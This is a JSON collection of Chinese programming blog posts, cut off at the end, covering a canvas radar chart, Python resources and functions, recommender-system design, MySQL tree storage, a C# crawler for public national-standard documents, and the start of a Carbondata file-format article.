[{"title":"浅谈canvas绘画王者荣耀--雷达图","body":"\n\n背景：\n一日晚上下班的我静静的靠在角落上听着歌，这时\"滴!滴!\"手机上传来一阵qq消息。原来我人在问王者荣耀的雷达图在页面上如何做出来的，有人回答用canvas绘画。那么问题来了，已经好久没有使用canvas绘画了东西。\nSO，就想自己画一个canvas雷达图，顺便重新回顾一下canvas的知识点。\n\n王者荣耀雷达图的基本构成。\n聊天记录当中的雷达图不是特别清楚，所以我这边截图了自己的一个战绩雷达图。\n\n是不是有被我的战绩吓到了，害不害怕！\n好了扯远了，让我们回到正题上来。\n通过截图上面的雷达图基本主体是一个正六边形，每个顶点则配有相应的文字说明。\n然后就是中间红色区域部分则由对角线上的点，连成一圈填充构成。因此这里我们称它为数据填充区\n所以这个雷达图我们分为三步来完成。\n①正六边形\n②数据填充区\n③绘制文本\n正六变形的坐标点解析\n在绘画这个正六边形的时候，先让我们对于这个正六边形进行简单的数学分析。\n这里先用画板画一个正六变形，然后进行切割并切角。\n\n是吧，借用以前高中还是初中的数学，正六边形的内角和720°，那么每一个对角就是120°。在已知对角线的长度。那么通过sin60°，cos60°一类的，那个可以求出各个三角形的边长。\n可是问题来了，这里我们要计算的是各个坐标点。而canvas的坐标轴是从左上角算（0，0）原点的单象限坐标轴。假设六边形的中心点是（250，250）、对角线的长度是100*2，那么按照三角函数推断：\nbottom-center坐标：（250, 250 + 100）\nbottom-left坐标：（250 - 100*sin(60°), 250+100*cos(60°)）\ntop-left坐标：（250 - 100*sin(60°), 250-100*cos(60°)）\ntop-center坐标：（250, 250 - 100）\ntop-right坐标：（250 + 100*sin(60°), 250-100*cos(60°)）\nbottom-right的坐标：（250 + 100*sin(60°), 250+100*cos(60°)）\n\n坐标是出来了，但是一个点一个点去绘画是不是有点太low了！\n肿么办？\n啦啦啦啦！\n那么就到了我们找规律的时间来了！\n但是在找规律的同时，为毛中心点的X轴和别人不一样，为毛一会加一会减。\n所以当思考各坐标点参数的规律的时候，让先回顾以前的函数角度图表\n\n看完这个函数参照图之后，让我再次修改一下6个点的书写方式。\nbottom-center坐标：（250 + 100*sin(0°), 250 + 100*cos(0°)）\nbottom-left坐标：（250 + 100*sin(300°), 250+100*cos(300°)）\ntop-left坐标：（250 + 100*sin(240°), 250-100*cos(240°)）\ntop-center坐标：（250 +100*sin(180°), 250 + 100*cos(180°)）\ntop-right坐标：（250 + 100*sin(120°), 250-100*cos(120°)）\nbottom-right的坐标：（250 + 100*sin60°), 250+100*cos(60°)）\n这个时候再看组坐标数据点，是不是感觉有点意思！\n\n那么这个时候我们便可以通过一个for循环，用一个数组把这6个坐标点给记录下来。\nvar pointArr = [];\nfor (var i = 0; i < 6; i++) {\n        pointArr[i] = {};\n       pointArr[i].x = 250 + 100 * Math.sin(60 * i);\n        pointArr[i].y = 250 + 100* Math.cos(60 * i);\n    }\n1.1 绘画正六边形\n前面既然，将正六边形的坐标点通过一个for循环解析出来。那么就是代码绘画正六边形了：\n<style>\n        canvas {\n            display: block;\n            width: 500px;\n            height: 500px;\n        }\n</style>\n<body>\n    <canvas class=\"radar\"></canvas>\n</body>\n<script>\n    var canvas = document.getElementsByClassName('radar')[0];\n    canvas.width = 500;\n    canvas.height = 500;\n    var ctx = canvas.getContext('2d');\n    ctx.save();\n    ctx.strokeStyle = '#888888';  // 设置线条颜色\n    var lineArr = [];\n    var rAngle = Math.PI * 2 / 6;  // 算出每一个内角和\n    console.log(rAngle);\n    var rCenter = 250;  // 确定中心点\n    var curR = 100;   // 确定半径长度\n    ctx.beginPath();\n    for (var i = 0; i < 6; i++) {\n        lineArr[i] = {};\n        lineArr[i].y = rCenter + curR * Math.cos(rAngle * i);\n        lineArr[i].x = rCenter + curR * Math.sin(rAngle * i);\n        ctx.lineTo(lineArr[i].x, lineArr[i].y);\n    }\n    ctx.closePath();\n    ctx.stroke();\n    ctx.restore();\n\n啦啦啦！！！一个正六边形就这么的画出来。\n备注：这里rAngle这里是很灵活的，如果说画18正边形，就除以18，然后for循环18次就ok了.\n\n哈哈！！感觉发现了新大陆了！绘制正多边形的貌似可以按照这个规律来！！\n1.2 绘画对角线\n既然前面有一个数组存储各个坐标点，所以让每个对角线对角点直线想连就ok了！\nctx.strokeStyle = '#e8ddc7';  // PS吸管那么一吸\n    ctx.save();\n    ctx.beginPath();\n    // for (var j = 0; j < 3; j++) {\n    //     ctx.lineTo(lineArr[j].x, lineArr[j].y);\n    //     ctx.lineTo(lineArr[j+3].x, lineArr[j+3].y);\n    //     ctx.stroke();\n    // }\n    for (var j = 0; j < 3; j++) {\n        ctx.moveTo(lineArr[j].x, lineArr[j].y);\n        ctx.lineTo(lineArr[j + 3].x, lineArr[j + 3].y);\n        ctx.stroke();\n    }\n    ctx.closePath();\n    ctx.restore();\n\n2.1数据填充区\n关于数据填充区，也就是雷达图当中，不规则的红色半透明的六边形。其实就是就可以看做中心点，到各个边角点之间线段为一区间这。之后就是将这个区间分成若干份，你占这个这个区间多少份，满份就是边角点，零份就是原点。\n观察前面的雷达图当中，B等级大概占据某个等级的50%左右。而B前面还有等级A、S。\n所以当S等级时候，可以看作区间 / 1。\nB等级看作区间 / 2, 那么A就是 区间 / 1.5.\n以此类推就可以得出剩下 C 就是区间 / 2.5、D：区间/ 3\n这里我就不用for循环书写了，直接偷懒手写一个对象。\n// 绘制数据区域\nvar letterData = {\n        'S': 1,\n        'A': 1.5,\n        'B': 2,\n        'C': 2.5,\n        'D': 3\n    }\nctx.save();\nctx.beginPath();\nfor (var i = 0; i < 6; i++) {\n        lineArr[i].yEnd = rCenter + curR * Math.cos(rAngle * i) / (letterData[rData[i][1]]);\n        lineArr[i].xEnd = rCenter + curR * Math.sin(rAngle * i) / (letterData[rData[i][1]]);\n        ctx.lineTo(lineArr[i].xEnd, lineArr[i].yEnd); \n        console.log(lineArr);\n }\nctx.closePath();\nctx.stroke();\nctx.fillStyle = 'rgba(255, 0, 0, 0.5)'; \nctx.fill();\n\n2.2 对数据填充区域绘画小圆点和边长\n当我们回归到前面的截图发现，需要单独把数据填充区域的的各个点位置给加强，并把边角用更深的线条的描绘出来。\nctx.lineWidth = 2;  //设置数据填充区域的线条颜色\nctx.strokeStyle = '#dd3f26';  //设置填充区域的颜色\nvar point = 3; //设置数据填充区域的小圆点大小\nfor (var i = 0; i < 6; i++) {\n        ctx.beginPath();\n        ctx.arc(lineArr[i].xEnd, lineArr[i].yEnd, point, 0, Math.PI * 2); \n        ctx.fillStyle = 'rgba(255, 0, 0, 0.8)';\n        ctx.fill();\n        console.log(lineArr);\n    }\n    ctx.restore();\n\n3.1 绘制文本\n王者荣耀雷达文本是需要绘制两点，\n①用黑色16px字体绘制各点描述点\n②用红色30px字体绘制各点能力级别\n但是估计看到绘制文本，估计有的小伙伴就会说。不是有数组的存储各个边角的坐标，直接一个for循环依次根据各个点绘画出来不就OK了。\n // 绘制文本\n    var rData = [\n        ['生存', 'S'],\n        ['经济', 'S'],\n        ['输出', 'S'],\n        ['KDA', 'B'],\n        ['打野', 'B'],\n        ['推进', 'S']\n    ]\n    ctx.save();\n    ctx.font = '16px Microsoft Yahei';  //设置字体\n    ctx.fillStyle = '#000';  // 颜色\n    for (var i = 0; i < 6; i++) {\n        var y = rCenter + curR * Math.cos(rAngle * i);\n        var x = rCenter + curR * Math.sin(rAngle * i);\n        ctx.fillText(rData[i][0], x, y);\n    }\n    ctx.restore();\n浏览器最终显示的视觉效果：\n\n\n是不是觉得很惊喜，这里输出、经济位置勉强还行，但是剩下的文字位置就偏差了许多了。所以在绘制文字的时候，还得针对文字的坐标位置进行相应的调整。\n3.2 绘制文本--描述\n既然直接调用坐标的位置会出问题，那么让根据上文中的图片文字的规则简单分析。\n①如果X轴 == 中心点，那么就判断Y轴。比中心点大文字下移一点，反之文字上移一点。\n②如果X轴 < 中心点，那么文字X轴位置就左移动一点,反正右移动距离。\n // 绘制文本\n    ctx.save();\n    var fontSize = 16;\n    ctx.font =  fontSize + 'px Microsoft Yahei';\n    ctx.textBaseline=\"middle\"; //设置基线参考点\n    ctx.textAlign=\"center\";  // 文本居中\n    ctx.fillStyle = '#000';\n    for (var i = 0; i < 6; i++) {\n        var y = rCenter + curR * Math.cos(rAngle * i);\n        var x = rCenter + curR * Math.sin(rAngle * i);\n        console.log(Math.sin(rAngle * i))\n        var s_width = ctx.measureText(rData[i][0]).width; //获取当前绘画的字体宽度\n        if ( x == rCenter) {\n            if (y > rCenter ) {\n                ctx.fillText(rData[i][0], x - s_width/2, y + fontSize);\n            } else {\n                ctx.fillText(rData[i][0], x - s_width/2, y - fontSize);\n            }\n        } else if ( x > rCenter) {\n            console.log(rData[i][0]);\n            ctx.fillText(rData[i][0], x + s_width*1.5, y);\n        } else {\n             ctx.fillText(rData[i][0], x - s_width*1.5, y);\n        }\n\n这里多了好几个不常用的属性，下面就是介绍这些属性的特点：\nctx.textBaseline: 设置或返回在绘制文本时使用的当前文本基线\n说到基线，各位童鞋想一想咱们以前英文练习本，上面有着一条条线条\n\n瞬间回忆到当年被罚抄英语单词的岁月，一把辛酸泪呀。\n\n网页设计字体也有一个基线的存在，因此canvas的基线点就是直接从坐标点划出一条横线基线。\n这里从网络上截图一张，通过设置基线参考位置，看看文本所在位置的改变。\n\nctx.textAlign: 这个文本水平居中，不过和CSS当中的居中不一样的是，他是从坐标点划出一条竖线分割文本的。\n\nctx.measureText : 返回包含指定文本宽度的对象。\n通俗一点的就是说，就是获取你绘制文本的宽度。假设一排文字内容为'Hello World'， size为16px大小文本。在这里高度都是16px稳定不变，这样canvas画其他元素对这个位置只需要Y轴移动这个文本的'size'大小就可以避免覆盖到上面。\n但是如果要X轴去移动位置,你根本不知道'Hello World'这串文本的长度。那么这个时候就需要ctx.measureText这个方法，获取当前你绘制文本的宽度。\n3.2 绘制文本--能力级别\n既然前面已经介绍了描述的绘画方法，那么依葫芦画瓢。让我们一并开始绘制能力级别的文本。\n// 绘制文本\n    ctx.save();\n    var fontSize = 16;\n    var maxfontSize = 30;\n    ctx.font =  fontSize + 'px Microsoft Yahei';\n    ctx.textBaseline=\"middle\";\n    ctx.textAlign=\"center\";\n    for (var i = 0; i < 6; i++) {\n        var y = rCenter + curR * Math.cos(rAngle * i);\n        var x = rCenter + curR * Math.sin(rAngle * i);\n        console.log(Math.sin(rAngle * i))\n        var s_width = ctx.measureText(rData[i][0]).width;\n        if ( x == rCenter) {\n            if (y > rCenter ) {\n                ctx.fillText(rData[i][0], x - s_width/2, y + fontSize);\n            } else {\n                ctx.fillText(rData[i][0], x - s_width/2, y - fontSize);\n            }\n        } else if ( x > rCenter) {\n            console.log(rData[i][0]);\n            ctx.fillText(rData[i][0], x + s_width*1.5, y);\n        } else {\n             ctx.fillText(rData[i][0], x - s_width*1.5, y);\n        }\n    }\n    ctx.restore();\n    ctx.save(); \n// 绘制等级\n    ctx.font = '30px Microsoft Yahei bold';\n    ctx.fillStyle = '#d7431f';\n    ctx.textBaseline=\"middle\";\n    ctx.textAlign=\"center\";\n    for (var i = 0; i < 6; i++) {\n        var y = rCenter + curR * Math.cos(rAngle * i);\n        var x = rCenter + curR * Math.sin(rAngle * i);\n        var M_width = ctx.measureText(rData[i][1]).width;\n        if ( x == rCenter) {\n            if (y > rCenter ) {\n                ctx.fillText(rData[i][1], x + M_width/2, y + fontSize);\n            } else {\n                ctx.fillText(rData[i][1], x + M_width/2, y - fontSize);\n            }\n        } else if ( x > rCenter) {\n            console.log(rData[i][0]);\n            ctx.fillText(rData[i][1], x + M_width, y);\n        } else {\n             ctx.fillText(rData[i][1], x - M_width, y);\n        }\n    }\n    ctx.restore();\n    ctx.save();\n页面最终效果：\n\n\n结尾\n好了！以上就是鄙人对于canvas绘画一点简单理解与复习了，其中也回顾了一些canvas基本属性点。后续如何用canvas玩出各种花样就看各位看官自己了！\n小贴士：\n在使用ctx.measureText这个方法的时候需要注意一下。这个方法在宽度参考对象也跟当前绘画环境的font-size有关联的。\n打个比方说，在绘制描述的文本的时候。font-size设置是16px，那么ctx.measureText('输出').width 是32。\n那么在绘制能力等级的时候，font-size设置是32，那么ctx.measureText('输出').width 就不再是32了而是64或者。\n贴士2：\n这里顺便帮做设计朋友推广他的一个微信H5视频案例，全程水墨画武侠风，画工炒鸡棒棒。\n\n\n另外前面loading动画宝剑出鞘css3部分，利用极少transform3d代码完成。感兴趣的童鞋可以微信扫一扫，看一下运动轨迹就心中估计就能猜出运行的的css3代码了。\n\n原创文章，文笔有限，才疏学浅，文中若有不正之处，再次再次再次欢迎各位啪啪的打脸赐教。（有句话说的好，重要的词得说三遍。）\n\n我是车大棒！我为我自己……emmmmmmm，今天就不自己带眼了，为朋友插眼吧！\n"},{"title":"Python资料汇总（建议收藏）","body":"整理汇总，内容包括长期必备、入门教程、练手项目、学习视频。\n\n\n一、长期必备。\n1. StackOverflow，是疑难解答、bug排除必备网站，任何编程问题请第一时间到此网站查找。\nhttps://stackoverflow.com/\n\n2. github，是源码学习、版本控制不可缺少的网站，找源码学习请第一时间到此网站，fork之后自己维护。\nhttps://github.com/\n\n3. Awesome Python 最全的python资源，没有之一，绝对不容错过的python资源大全。\nhttps://github.com/vinta/awesome-python\n\n4. Awesome Python 的中文翻译\nhttps://github.com/jobbole/awesome-python-cn\n\n5. python中文学习大本营http://www.pythondoc.com/\n\n6. 伯乐在线网站http://python.jobbole.com/\n\n\n二、入门教程\n1. 笨方法学python，最受欢迎的python入门教程。边学边撸的教程。\n\n2. 简明python教程，简明是最大的特点\nhttp://old.sebug.net/paper/python/\n\n3. python菜鸟教程。\n\n4. 廖雪峰的python教程，重点讲述python和其它语言的不同，适合有其它语言基础的朋友。\n三、练手项目\n1. 自写一个分布式爬虫。比如爬取知乎全站/头条全站/豆瓣全站等等，任何一个你想爬取的网站。完成之后获得如下技能。用爬虫项目练手实在能学习许多知识。\n1.1. http协议知识，能学会如何封装http请求包。\n\n1.2. redis/mongo/mysql等各种数据库知识。nosql和sql的知识有多重要就不用多说了。\n\n1.3. scrapy爬虫神器的知识\n\n1.4 反爬虫知识。\n比如验证码识别，javascript混淆与还原，加密与解密，ajax异步请求，更换代理ip等等。\n\n1.5.谷歌开发人员工具。\n\n2. 人工智能方向，分别用k近邻、svm、神经网络等各种机器学习的方法识别mnist。这是人工智能的入门项目。\n\n3. 数据分析方向。[使用 Spark 和 D3.js 分析航班大数据]\n\n4. 25个练手项目由易到难，代码量从几十行到几千行，在实验环境里保证可以全部完成。\nhttp://www.360doc.com/content/16/0314/09/1513309_542022647.shtml\n\n\n四、视频教程。\nhttp://bbs.itheima.com/thread-336964-1-1.html\n\n转  IT老友"},{"title":"个性化推荐系统最近一些复盘以及探索","body":"       最近和很多人探讨、交流推荐系统相关很多事情，喜欢这种理性探讨，这种探讨能够让双方都有收获，一个是负\n反馈再有就是对于推荐系统怎样做深入，再有就是推荐系统架构一点思索。\n       负反馈最近探讨很多一个问题。一直有疑惑，大部分的内容都是关于movielens这种含有客户负反馈的，但是我\n只是一个普通的电商网站，只有客户的购买浏览等记录，却缺乏客户不喜欢物品的负反馈，即使是我使用itemcf，也\n只能是单类协同过滤，效果不是很好，查了一些paper，除了使用其他的结合内容，上下文等之外，就只有采样了，\n但是我所在的行业，就算客户没买，也不一定是不喜欢，只是可能不知道而已，想探讨一下，是否了解这种隐反馈的场\n景实际应用中还有没有其他的处理方法呢？\n        这是一个好问题，一个有意思问题，也是我们探讨了很多次问题。负反馈其实我们可以思考一下，不买就是不喜\n欢或者说没推准？那推出来不点击不浏览呢？应是不能作为负反馈的，因为一个用户不点击、不购买因素太多了，钱\n不够？人委屈（对这个素材不满意而已，把品类都降权太极端）了可能都不会去点击。\n        再有就是现在淘宝京东等app对于素材都有负反馈收集，但其实了解到负反馈人很少，因为用户没义务去点击那\n个，他也不愿意去反馈。其实很多用户是不满意就直接走了，不会提意见的，这是实际数据反馈情况。\n        那负反馈要不要做，做是当然要做但要小心做，因为其实很多用户在频道内行为是很有限的，分类召回级直接卡\n掉，点击、浏览、GMV转化等指标应该一下就会降一大截。\n        现在推荐系统，两个方面一个是用户持久喜好，作为离线偏好，这种负反馈尽量不要做。另外是用户实时篇好，\n因为很多情况下用户看到喜欢内容、商品会点击两下看看，真喜欢可能就购买了。实时用户篇好目前是很重要用户推\n荐构成部分，能抓取就抓用户了，抓不住就走了。对于实时篇好可以根据给用户推荐内容、商品都未点击，可以做降\n权处理，不是过滤，过滤要慎重，用户点击多了还要加权，抓住用户实时兴趣，引导用户多浏览、多看。\n       我所在的行业,但是由于某一类目的商品选择较少,导致这一类型各个商品和其他类型的各种商品的相似度都较高,\n导致不管其他什么商品都会很容易推荐这一类目的热门商品,请问您有遇到过这种情况嘛?一般工程上会怎样解决这种\n问题呢?\n        关于推荐系统的热门商品权重过大的问题，除了上面的规则干预，还有没其他的模型计算方法呢？我用的是项亮\n书中的在itemcf时变了分母的幂次，但效果不好，您还知道工程中有其他合适的算法嘛？\n       热门商品是个好东西，但不受控制总是推出热门商品不是一个好的做法，热门商品作为一个单独热门召回级，热\n门商品被关联数量一定要控制，设置相关策略阀值。\n       对于热门商品做热度算法处理，就是热门内容、商品作为召回级，给予阶梯式曝光，如果热门能很大程度提升整\n体转化指标，那么可以给相应加权如做不到进行相应降权。\n       热门商品召回级还有一个很大用处，目前看在一个频道很多用户是行为很少的，热门作为拉新很重要一个手段，\n因为热门某种意义就是命中了大多数人喜好。是作为召回级不够用户很重要一个数据补充渠道，用好还是相当重要。\n       最近探讨另外一个重要点，推荐系统如何做深入，毕竟越深越美，如果有了粗力度召回级，那么就是做细粒度召\n回级。就像文章，最开始做主题LDA分类，但这种分类很粗，加进相似文章召回，数据猛的一升。后来又做了细粒度\n标签比主题细分很多一种划分主题方式，这种就要结合LDA将力度又不要划分太细，不然会发现用户点击两下全是同\n一个内容。\n       内容细的标签，沉下心来仔细想想，很像搜索引擎，用户点击某个标签，然后返回标签下内容。如果把标签理解\n为搜索引擎搜索词，这就是极其类似召回数据方式。很多事情都是相通的，要静下心来去探索、去发现。\n       商品最近也是在探索细粒度召回级事情，以前做的更多是品类，品类作为召回级核心，后边会更多探索用户对于\n品牌、性别、价格段、季节、地理位置、手机信息等多个更细粒度召回级探索。补充完善粗召回级之外内容，预估对\n转化数据都是会有提升的。\n       再有就是也在对于商品标签不断完善，是另外一个方向对于召回级扩大以及更加细分，让用户行为能更精准进行\n推荐。品牌、价格段、性别、商品标签都是对于商品分类召回细化，仔细想想很像是对于内容由主题到标签，粗粒度\n细粒度结合。\n       这些新的尝试对于线上推荐服务、推荐引擎也是一个新的挑战，需要花费心思去将架构抽象化合理化。其实做事\n情难易程度，不在于外界，在于你对于自己要求，要求高了，难度自然就大了。\n       最近在看Google对于分布式系统设计方面内容，收获很多，对于复杂系统给出最简洁设计，是Google设计分布式\n系统很重要设计理念，求于至简，归于永恒。简洁其实是很难很复杂要求很高设计，因为所有事情都考虑到，才能做到\n至简，至繁归于至简。\n\n      扫码关注公众号"},{"title":"【MySQL疑难杂症】如何将树形结构存储在数据库中（方案一 Adjacency List）","body":"　　今天来看看一个比较头疼的问题，如何在数据库中存储树形结构呢？\n　　像mysql这样的关系型数据库，比较适合存储一些类似表格的扁平化数据，但是遇到像树形结构这样有深度的人，就很难驾驭了。\n　　举个栗子：现在有一个要存储一下公司的人员结构，大致层次结构如下：\n\n \n　　（画个图真不容易。。）\n　　那么怎么存储这个结构？并且要获取以下信息：\n　　1.查询小天的直接上司。\n　　2.查询老宋管理下的直属员工。\n　　3.查询小天的所有上司。\n　　4.查询老王管理的所有员工。\n　　\n方案一、(Adjacency List)只存储当前节点的父节点信息。\n　　CREATE TABLE Employees(　　eid int,　　ename VARCHAR(100),        position VARCHAR(100),　　parent_id int　　)\n　　记录信息简单粗暴，那么现在存储一下这个结构信息：\n　　\n　　好的，现在开始进入回答环节：\n　　1.查询小天的直接上司：\n 　　SELECT e2.eid,e2.ename FROM employees e1,employees e2 WHERE e1.parent_id=e2.eid AND e1.ename='小天';\n　　\n　　2.查询老宋管理下的直属员工：\n　　SELECT e1.eid,e1.ename FROM employees e1,employees e2 WHERE e1.parent_id=e2.eid AND e2.ename='老宋';\n　　\n　　3.查询小天的所有上司。\n　　这里肯定没法直接查，只能用循环进行循环查询，先查直接上司，再查直接上司的直接上司，依次循环，这样麻烦的事情，还是得先建立一个存储过程：\n　　睁大眼睛看仔细了，接下来是骚操作环节：\n\nCREATE DEFINER=`root`@`localhost` FUNCTION `getSuperiors`(`uid` int) RETURNS varchar(1000) CHARSET gb2312\nBEGIN\n    DECLARE superiors VARCHAR(1000) DEFAULT '';\n    DECLARE sTemp INTEGER DEFAULT uid;\n    DECLARE tmpName VARCHAR(20);\n\n    WHILE (sTemp>0) DO\n        SELECT parent_id into sTemp FROM employees where eid = sTemp;\n        SELECT ename into tmpName FROM employees where eid = sTemp;\n        IF(sTemp>0)THEN\n            SET superiors = concat(tmpName,',',superiors);\n        END IF;\n    END WHILE;\n        SET superiors = LEFT(superiors,CHARACTER_LENGTH(superiors)-1);\n    RETURN superiors;\nEND\n\n　　这一段存储过程可以查询子节点的所有父节点，来试验一下　\n \n　　好的，骚操作完成。\n　　显然，这样。获取子节点的全部父节点的时候很麻烦。。\n　　4.查询老王管理的所有员工。\n　　思路如下：先获取所有父节点为老王id的员工id，然后将员工姓名加入结果列表里，在调用一个神奇的查找函数，即可进行神奇的查找：\n\nCREATE DEFINER=`root`@`localhost` FUNCTION `getSubordinate`(`uid` int) RETURNS varchar(2000) CHARSET gb2312BEGIN   DECLARE str varchar(1000);  DECLARE cid varchar(100);DECLARE result VARCHAR(1000);DECLARE tmpName VARCHAR(100);SET str = '$';   SET cid = CAST(uid as char(10));   WHILE cid is not null DO     SET str = concat(str, ',', cid);   SELECT group_concat(eid) INTO cid FROM employees where FIND_IN_SET(parent_id,cid);         END WHILE;  SELECT GROUP_CONCAT(ename) INTO result FROM employees WHERE FIND_IN_SET(parent_id,str);RETURN result;   END\n\n　　看神奇的结果：\n　\n　　虽然搞出来了，但说实话，真是不容易。。。\n　　这种方法的优点是存储的信息少，查直接上司和直接下属的时候很方便，缺点是多级查询的时候很费劲。所以当只需要用到直接上下级关系的时候，用这种方法还是不错的，可以节省很多空间。后续还会介绍其它存储方案，并没有绝对的优劣之分，适用场合不同而已。\n　　本篇至此告一段落，欢迎大家继续关注。\n "},{"title":"Python测试开发之函数","body":"对于初学者而言，感觉函数还是不是很好理解，尤其是当写一个脚本，或者是写一个算法，认为可能for循环就已经可以解决的问题为什么还要用函数来实现呢？\n今天就来说一下函数的优点，其实函数的最大优点就是可重用，一个函数实现后可以被其他不同的脚本来调用，这也就是体现了代码的重用性。\n\n函数的定义：def 函数名():，在定义函数时，一定要用关键字def开头，然后紧接着是函数名，括号里是要传的的参数，当然也可不传，最后面是个冒号：\n\n　　　　def add(x,y):\n　　　　    return x+y\n　　这就是一个最简单的函数\n　　2.函数的返回值：Python中自定义的函数如果有return，则返回实际的结果，如果没有返回值，则返回None，这是Python与其他语言的区别之一\n　　3.函数的调用：在定义好一个函数后，如果要实现函数的功能，一定要对其进行引用，不然函数体是不会被执行的，调用的方法也很简单，就是函数名和需要的参数即可\n　　例如上边add函数的调用： add(2,3)即可返回5\n　　\n　　注意：此处如果传入两个字符串也是OK的，这也是Python的特殊之处，他会根据传入的值来进行相应操作，如果传入的是两个数字，则进行相加，如果是两个字符串则进行拼接，但是此处必须传入的类型一致，否则会报错，所以可以根据你的需要进行处理，如果要做特定的实现可以用isinstance来判断一下类型，来达到自己想要的效果。\n　　\n　　\n　　4.函数的传参：函数的参数分为按值传递和按地址传递。按值传递是将不可变的参数传递给函数，按地址传递是将可变的参数传递给函数。此处的可变参数与不可变参数是相对内存地址而言的，如果传入的是字符串、元祖、数字，是不可变对象，就是按值传递，为什么说是不可变的，例如如果将a=1这样一个变量传递给函数，那么就是说将1的内存地址传给函数，那么计算机给1分配过内存地址后就不会在变化，所以说在函数体内对a做的任何操作都不会影响函数体外a的值，来看一个例子就会比较好理解了：\na =1\ndef print_sth(s):    s=s+1    return s\nprint print_sth(a)print a  \n　　执行结果：\n　　\n　　下面我们来看一下原理：\n　　这就是按值传递的原理，当函数体内对a进行加1操作，实际是指向另一个内存地址了，用id()就可以查看内存地址\n　　5.看了按值传递的原理，按引用传递应该就好理解了，按引用传递就是传递一些可变参数，例如list、dict等，先来看一下他们的内存地址的变化：\n　　\n　　可以看到当你在对一个list进行操作时，它指向的内存地址实际是没有变化的，所以说当传递可变参数时，函数体内对变量的操作是会影响函数体外的变量的，看一个例子就更明白了：\n　　\n　　现在对函数的按值传递和按引用传递参数应该非常了解了吧。\n　　6.可变参数的表示：*args表示传入的是一个元祖，**args表示传入的是一个字典，在实际使用中当不确定要传入多少个参数时，就可以使用这种方法：\n　　def func(a,*args):\n　　　　for i in args:\n　　　　　　a +=i\n　　　　return a\n　　\n　　你会发现，你传递几个参数都不会出问题，这就是可变参数的好处，然后看一下**args吧：\n　　\n \n　　看完这些，你是否对函数有了很大理解，现在应该感觉函数可以实现很多你想要实现的功能吧，这可不仅仅是几个for循环就能实现的哦，赶快学学函数吧，这也是后面写好代码的基础。\n \n \n　　\n "},{"title":"C#爬虫系列（一）——国家标准全文公开系统","body":"网上有很多Python爬虫的帖子，不排除很多培训班借着AI的概念教Python，然后爬网页自然是其中的一个大章节，毕竟做算法分析没有大量的数据怎么成。\nC#相比Python可能笨重了些，但实现简单爬虫也很便捷。网上有不少爬虫工具，通过配置即可实现对某站点内容的抓取，出于定制化的需求以及程序员重复造轮子的习性，我也做了几个标准公开网站的爬虫。\n在学习的过程中，爬网页的难度越来越大，但随着问题的一一攻克，学习到的东西也越来越多，从最初简单的GET，到POST，再到模拟浏览器填写表单、提交表单，数据解析也从最初的字符串处理、正则表达式处理，到HTML解析。一个NB的爬虫需要掌握的知识不少，HTTP请求、响应，HTML DOM解析，正则表达式匹配内容，多线程、数据库存储，甚至有些高级验证码的处理都得AI。\n当然，爬爬公开标准不是那么难，比如国家标准全文公开系统。\n整个过程需要爬以下页面：\n\n列表页\n详细信息页\n文件下载页\n\n需要处理的技术问题有：\n\nHTTP请求\n正则表达式\nHTML解析\nSqlLite数据库存储\n\n一、列表页\n首先查看到标准分GB和GB/T两类，地址分别为：\nhttp://www.gb688.cn/bzgk/gb/std_list_type?p.p1=1&p.p90=circulation_date&p.p91=desc\n和\nhttp://www.gb688.cn/bzgk/gb/std_list_type?p.p1=2&p.p90=circulation_date&p.p91=desc。\n从中可以看出，GET请求的查询字符串参数p1值为1和2分别查询到GB和GB/T。因此，要获取到标准列表，向以上地址发送GET请求即可。\n\nHttpWebRequest httprequst = (HttpWebRequest)WebRequest.Create(Url);\nHttpWebResponse webRes = (HttpWebResponse)httprequst.GetResponse();\n using (System.IO.Stream stream = webRes.GetResponseStream())\n{\n     using (System.IO.StreamReader reader = new StreamReader(stream,         System.Text.Encoding.GetEncoding(\"utf-8\")))\n     {\n         content = reader.ReadToEnd();\n     }\n }\n\n标准共N多页，查看第二页标准列表，地址更改为：\nhttp://www.gb688.cn/bzgk/gb/std_list_type?r=0.7783908698326173&page=2&pageSize=10&p.p1=1&p.p90=circulation_date&p.p91=desc。\n由此可见page参数指定了分页列表的当前页数，据此，循环请求即可获取到所有的标准列表信息。\n\n二、详细信息页\n获取到标准列表后，下一步我需要获取到标准的详细信息页，从详细信息页中抓取更多的标准说明信息，例如标准的发布单位、归口单位等。\n\n查看标准详细页URL，其值为：\nhttp://www.gb688.cn/bzgk/gb/newGbInfo?hcno=9E5467EA1922E8342AF5F180319F34A0。\n可以看出每个标准有个GUID值，在列表页面中点击按钮“查看详细”，转到详细页。实现这个跳转的方式，最简单的是HTML超链接，此外还可以是JS脚本，甚至是POST数据到服务器。不同的链接方式，自然需要不同的抓取方式，因此需要查看列表页源码来分析该站点的实现方式并找到对应的处理方法。\n\n通过分析源码，可以看到在点击标准号时，通过JS的showInfo函数打开详细页面，由于JS方法传递的ID即为详细页面的参数ID，因此没必要去模拟onclick执行JS函数，直接解析到该GUID，GET请求详细页面即可。解析该GUID值，可以通过正则表达式方便的抓取到。\n获取到详细信息页面后，要解析其中的内容，此时使用正则表达式解析就比较费劲了，可以采用HTML解析。C#解析HTML的第三方类库有不少，选择其中一款即可，HtmlAgilityPack或Winista.HtmlParser都是比较好用的。\n三、文件下载页\n解析到标准详细信息后，还需要进一步获取到标准PDF文件，分析详细页面可以看到标准文件下载页面路径为：\nhttp://c.gb688.cn/bzgk/gb/showGb?type=download&hcno=9E5467EA1922E8342AF5F180319F34A0\n\n进一步分析PDF文件的URL为：\nhttp://c.gb688.cn/bzgk/gb/viewGb?hcno=9E5467EA1922E8342AF5F180319F34A0。\n仍然是那个GUID值，因此可以直接GET请求该地址即可下载标准PDF文件。\n至此标准的属性信息和标准PDF文件都可以下载到了，然后需要将这些信息存储起来。存储为SQL Server、Oracle自然比较笨重，即使Excel和Access也不大友好，推荐此类临时存储可以使用SqlLite。\n\n\n string connectionString = @\"Data Source=\" + dbBasePath + \"StandardDB.db;Version=3;\";\nm_dbConnection = new SQLiteConnection(connectionString);\nm_dbConnection.Open();\nSQLiteCommand command = new SQLiteCommand(sql, m_dbConnection);\ncommand.ExecuteNonQuery();\nm_dbConnection.Close();\n\nView Code\n "},{"title":"Carbondata源码系列（二）文件格式详解","body":"在上一章当中，写了文件的生成过程。这一章主要讲解文件格式（V3版本）的具体细节。\n1、字典文件格式详解\n字典文件的作用是在存储的时候将字符串等类型转换为int类型，好处主要有两点：\n1、减少存储占用空间\n2、用在需要group by的字段上比较合适，可以减少计算时的shuffle的数据量。\n每一个字典列都有对应的三种文件.dict, .sortindex, .dictmeta文件，输出格式都是thrift格式\n1.1 